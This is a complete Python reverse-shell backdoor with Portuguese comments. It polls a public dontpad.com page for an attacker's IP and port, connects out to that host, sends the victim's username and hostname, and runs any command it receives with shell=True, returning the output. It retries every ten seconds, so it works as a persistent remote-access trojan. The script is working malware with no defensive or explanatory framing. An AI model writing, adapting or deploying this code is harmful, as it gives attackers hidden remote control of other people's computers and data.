#!/bin/env python3

import socket
import os
import platform
import subprocess
from time import sleep
import requests


def shell(sock):
    while True:
        cmd = sock.recv(1024)
        proc = subprocess.Popen(cmd.decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output = proc.stdout.read()
        output += proc.stderr.read()
        output += b'\n[+] Executado'

        data = output.decode('latin-1').encode()
        sock.send(data)


def session(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((ip, port))
        sock.send(f'{os.getlogin()}@{platform.node()}'.encode())
        shell(sock)

    except Exception as err:
        print(err)
        return 0


# Função principal
if __name__ == '__main__':

    while True:
        try:
            endpoint = requests.get('http://dontpad.com/hell0')
            if endpoint.status_code == 200:
                data = endpoint.text.split('<textarea id="text">')[1]
                data = data.split('</textarea>')[0]
                if ':' in data:
                    data = data.split(':')
                    if len(data) == 2:
                        ip = data[0]
                        if data[1].isnumeric():
                            port = int(data[1])
                            session(ip, port)
        except:
            pass
        sleep(10)
